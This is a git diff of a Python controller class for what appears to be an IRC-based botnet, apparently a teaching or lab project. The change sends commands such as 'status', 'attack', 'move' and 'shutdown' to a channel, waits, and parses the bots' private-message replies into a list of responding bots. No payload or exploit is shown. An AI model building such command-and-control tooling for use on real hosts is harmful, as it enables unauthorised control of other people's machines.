@@ -37,34 +37,47 @@ class Controller_Client:
     #TODO define functionality for each command 
     def __send_command(self, command):
         self.send_to_channel(command)
-        response = self.get_text()
-
-        if ("PRIVMSG" not in response) or (self.channel not in response):
-            return False #TODO
-        if command == "status":
-            self.send_to_channel("status")
-            return True
-        if command.startswith("attack "):
-            self.send_to_channel(command)
-            return True
-        if command.startswith("move "):
-            self.send_to_channel(command)
-            return True
-        elif command == "quit":
-            self.__terminate()
-            return True
-        elif command == "shutdown":
-            self.send_to_channel(command)
-            return True
-        else:
-            self.send_to_channel(command)
-            return False
-
         timeout = 5 # timeout (in seconds)
         timeout_start = time.time()
         self.log("Waiting for responses...")
         while time.time() < timeout_start + timeout:
             pass
+        response = self.get_text() # get response from bots
+        self.log("bot response: " + response)
+        self.log("done")
+
+        # check if msg is a DM
+        if ("PRIVMSG" in response) and (self.channel not in response):
+            self.__parse_response(command, response)
+    
+    def __parse_response(self, command, response):
+        response_dict = {}
+        for line in response.strip().split('\n'):
+            # self.log("LINE:  " + line)
+            # get the sender's ID
+            sender = line.split(':')[1].split(' ')[0].split('!')[0]
+            # get the message sent by the sender
+            message = line.split(' :')[1].strip()
+            response_dict[sender] = message
+
+        if command == "status":
+            bot_list = []
+            for sender in response_dict:
+                bot_list.append(sender)
+            self.log("Found " + str(len(bot_list)) + " bots: " + ", ".join(bot_list))
+            return True
+        if command.startswith("attack "):
+            return True
+        if command.startswith("move "):
+            return True
+        elif command == "quit":
+            self.__terminate()
+            return True
+        elif command == "shutdown":
+            return True
+        else:
+            return False
+
             
     # Closes connection and terminates controller
     def __terminate(self):
